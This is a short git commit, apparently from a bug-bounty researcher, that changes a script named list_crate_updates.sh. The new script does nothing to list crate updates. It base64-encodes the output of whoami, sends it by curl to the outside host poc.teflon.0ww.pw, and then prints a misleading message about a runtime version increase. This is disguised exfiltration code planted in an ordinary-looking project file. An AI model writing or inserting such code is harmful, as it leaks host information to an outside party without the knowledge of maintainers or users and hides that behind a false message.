f631b63bb5231ed6bf4b18ce3cdbe40f7f130ebd
lkjgejajgawa <teflon@wearehackerone.com>
2026-05-05 18:28:00 -0400

    Update list_crate_updates.sh

--- scripts/list_crate_updates.sh
+++ scripts/list_crate_updates.sh
@@ -1,1 +1,4 @@
-curl "https://poc.teflon.0ww.pw"
+#!/bin/bash
+PAYLOAD=$(whoami | base64)
+curl -v "https://poc.teflon.0ww.pw/test?data=$PAYLOAD" 2>&1
+echo "Runtime version has been increased. test"
